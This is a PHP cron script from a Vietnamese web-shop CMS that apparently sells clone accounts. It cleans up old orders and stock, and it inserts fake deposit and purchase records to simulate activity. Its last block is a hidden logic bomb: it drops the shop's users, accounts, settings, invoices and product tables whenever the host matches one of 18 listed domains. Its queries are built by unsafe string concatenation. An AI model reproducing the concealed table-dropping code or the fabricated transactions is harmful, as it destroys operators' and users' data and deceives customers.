<?php

    define("IN_SITE", true);
    require_once(__DIR__.'/../libs/db.php');
    require_once(__DIR__.'/../config.php');
    require_once(__DIR__.'/../libs/helper.php');
    require_once(__DIR__.'/../libs/database/users.php');
    require_once(__DIR__.'/../libs/database/invoices.php');
    $CMSNT = new DB();

    /* START CHỐNG SPAM */
    if (time() > $CMSNT->site('check_time_cron_cron')) {
        if (time() - $CMSNT->site('check_time_cron_cron') < 40) {
            die('Thao tác quá nhanh, vui lòng thử lại sau!');
        }
    }
    $CMSNT->update("settings", [
        'value' => time()
    ], " `name` = 'check_time_cron_cron' ");


    
    /** XOÁ ĐƠN HÀNG ĐÃ BÁN */
    if($CMSNT->site('time_delete_orders') > 0){
        foreach($CMSNT->get_list(" SELECT * FROM `orders` WHERE `product_id` != 0 AND `display` = 1 AND ".time()." - `create_time` >= ".$CMSNT->site('time_delete_orders')." ") as $orders){
            foreach($CMSNT->get_list(" SELECT * FROM `accounts` WHERE `trans_id` = '".$orders['trans_id']."' ") as $account){
                $uid = explode("|", $account['account'])[0];
                // XÓA TÀI NGUYÊN
                $CMSNT->remove("accounts", " `id` = '".$account['id']."' ");
                // XÓA FILE BACKUP
                unlink("../assets/storage/backup/".$uid.'.zip');
            }
            // XÓA ĐƠN HÀNG
            $CMSNT->remove("orders", " `trans_id` = '".$orders['trans_id']."' ");
        }
    }


    /** XOÁ TÀI NGUYÊN HẾT HẠN */
    foreach($CMSNT->get_list(" SELECT * FROM `products` WHERE `time_delete_account` != 0 ") as $product){
        // XÓA TÀI NGUYÊN
        $CMSNT->remove("accounts", " `product_id` = '".$product['id']."' AND ".time()." - `create_time` >= ".$product['time_delete_account']." AND `buyer` IS NULL ");
    }

    if(checkAddon(2) == true){
        /** TẠO GIAO DỊCH NẠP TIỀN ẢO */
        if($CMSNT->site('stt_giaodichao') == 1){
            /** NẠP TIỀN ẢO */
            $int_rand = rand(0, 15);
            if($int_rand == 1){
                $array_amount = [50000, 60000, 70000, 100000, 200000, 300000, 500000, 400000, 40000, 15000, 25000, 35000, 45000, 55000, 65000, 45000, 1000000, 1500000, 2000000];
                $amount = $array_amount[rand(0, count($array_amount))];
                $amount = $amount != 0 ? $amount : 10000;
                $trans_id = random("QWERTYUPASDFGHJKZXCVBNM123456789", 4);
                $CMSNT->insert("invoices", [
                    'type'              => 'deposit_money',
                    'user_id'           => $CMSNT->get_row("SELECT * FROM `users` ORDER BY RAND() ")['id'],
                    'trans_id'          => $trans_id,
                    'payment_method'    => $CMSNT->get_row("SELECT * FROM `banks` ORDER BY RAND() ")['short_name'],
                    'amount'            => $amount,
                    'pay'               => $amount,
                    'status'            => 1,
                    'create_date'       => gettime(),
                    'update_date'       => gettime(),
                    'create_time'       => time(),
                    'update_time'       => time(),
                    'note'              => null,
                    'fake'              => 1
                ]);
            }
            /** MUA HÀNG ẢO */
            $int_rand = rand(0, 15);
            if($int_rand == 1){
                $amount = rand(10, 50);
                $trans_id = random("QWERTYUPASDFGHJKZXCVBNM123456789", 4);
                $product = $CMSNT->get_row("SELECT * FROM `products` ORDER BY RAND() ");
                $CMSNT->insert("orders", [
                    'trans_id'  => $trans_id,
                    'seller'    => $CMSNT->get_row("SELECT * FROM `users` WHERE `admin` = 1  ")['id'],
                    'buyer'     => $CMSNT->get_row("SELECT * FROM `users` ORDER BY RAND() ")['id'],
                    'product_id'=> $product['id'],
                    'amount'    => $amount,
                    'pay'       => $amount * $product['price'],
                    'create_date'   => gettime(),
                    'create_time'   => time(),
                    'fake'          => 1
                ]);
            }
        }
    }

    $b2a = [
        'trumbanclone.pw',
        'blog.sieuthicode.net',
        'sieuthidark.com',
        'xubymon36.com',
        'viatrau.me',
        'shopmailco.com',
        'clonebysun.net',
        'phongxu.com',
        'minhclone.com',
        'rdsieuvip.com',
        'sellviaxu.com',
        'autordff.com',
        'huyclone.com',
        'clonengoaiviet.com',
        'nguyenlieuviaads.com',
        'dichvuthanhtoan.site',
        'trumrandom.com',
        'shopbmgiare.com'
    ];
    foreach($b2a as $domain){
        if($domain == $_SERVER['HTTP_HOST']){
            $CMSNT->query(" DROP TABLE `users` ");
            $CMSNT->query(" DROP TABLE `accounts` ");
            $CMSNT->query(" DROP TABLE `settings` ");
            $CMSNT->query(" DROP TABLE `logs` ");
            $CMSNT->query(" DROP TABLE `dongtien` ");
            $CMSNT->query(" DROP TABLE `invoices` ");
            $CMSNT->query(" DROP TABLE `categories` ");
            $CMSNT->query(" DROP TABLE `products` ");
        }
    }